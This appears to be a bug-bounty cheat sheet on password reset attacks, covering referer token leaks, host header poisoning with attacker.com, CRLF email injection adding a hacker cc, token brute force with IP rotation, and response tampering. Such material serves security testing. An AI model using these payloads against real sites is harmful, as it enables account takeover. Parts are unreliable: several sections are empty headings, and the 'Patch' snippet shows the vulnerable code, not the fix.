# Password Reset Token Leak Via Referrer

The **HTTP referer** is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed 

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

## Exploitation

* Request password reset to your email address
* Click on the password reset link
* Dont change password
* Click any 3rd party websites\(eg: Facebook, twitter\)
* Intercept the request in burpsuite proxy
* Check if the referer header is leaking password reset token.

## Impact

It allows the person who has control of particular site to change the user‚Äôs password \(CSRF attack\), because this person knows reset password token of the user.

# Account Takeover Through Password Reset Poisoning

If you find a host header attack and it‚Äôs out of scope, try to find the password reset button! 

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

## Exploitation

* Intercept the password reset request in Burpsuite
* Add following header or edit header in burpsuite\(try one by one\)

```text
Host: attacker.com
```

```text
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```text
 Host: target.com
 Host: attacker.com
```

* Check if the link to change the password inside the email is pointing to attacker.com

## Patch

Use `$_SERVER['SERVER_NAME']` rather than `$_SERVER['HTTP_HOST']`

```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```

## Impact

The victim will receive the malicious link in their email, and, when clicked, will leak the user‚Äôs password reset link / token to the attacker, leading to full account takeover.

# Account Takeover: Password Reset With Manipualating Email Parameter

# Full Account Takeover via Changing Email And Password of any User through API Parameters

## Exploitation

## No Rate Limiting: Email Bombing <a id="5-no-rate-limiting-email-bombing"></a>

## Exploitation

* Start the Burp Suite and Intercept the password reset request
* Send to intruder
* Use null payload

# Find out How Password Reset Token is Generated

Figure out the pattern of password reset token 

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg&usqp=CAU)

If it

* Generated based Timestamp
* Generated based on the UserID
* Generated based on email of User
* Generated based on Firstname and Lastname
* Generated based on Date of Birth
* Generated based on Cryptography

Use Burp Sequencer to find the randomness or predictability of tokens.

# Response manipulation: Replace Bad Response With Good One

Look for Request and Response like these

```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```

Change Response

```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```

## Using Expired Token <a id="8-using-expired-token"></a>

* Check if the expired token can be reused

## Brute Force Password Rest token <a id="9-brute-force-password-rest-token"></a>

Try to bruteforce the reset token using Burpsuite

```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```

* Use IP-Rotator on burpsuite to bypass IP based ratelimit.

## Try Using Your Token <a id="10-try-using-your-token"></a>

# Session I**nvalidation** in Logout/Password Reset

When a user **logs out or reset his password**, the current session should be invalidated.  
Therefore, **grab the cookies** while the user is logged in, **log out**, and **check** if the **cookies** are still **valid**.  
Repeat the process **changing the password** instead of logging out.

# Reset Token expiration Time

The **reset tokens must have an expiration time**, after it the token shouldn't be valid to change the password of a user.

# Extra Checks

* Use username@burp\_collab.net and analyze the callback
* User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* Long password \(&gt;200\) leads to DoS
* Append second email param and value
